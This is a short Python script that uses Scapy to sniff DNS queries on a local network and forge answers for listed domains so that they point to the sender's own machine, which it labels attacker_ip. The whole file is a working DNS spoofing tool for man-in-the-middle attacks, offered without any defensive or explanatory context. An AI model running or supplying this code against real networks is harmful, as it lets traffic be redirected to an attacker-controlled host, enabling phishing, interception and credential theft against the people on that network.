from scapy.all import *
from scapy.all import DNS, DNSQR, IP, UDP

import netifaces
from autodetect_network import get_local_ip, get_network_interface

attacker_ip = get_local_ip()  # Your machine IP automatically detected
iface = get_network_interface()  # Active network interface automatically detected

# Load blocked domains
blocked_domains = []
with open("blocked_domains.txt", "r") as f:
    blocked_domains = [line.strip().lower() for line in f]

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        for domain in blocked_domains:
            if domain in qname.lower():
                print(f"[!] Spoofing DNS response for {qname}")
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=53)/\
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=qname, ttl=10, rdata=attacker_ip))
                send(spoofed_pkt, verbose=0)

def main():
    print(f"[*] Using interface: {iface}")
    sniff(iface=iface, filter="udp port 53", store=0, prn=dns_spoof)

if __name__ == "__main__":
    main()
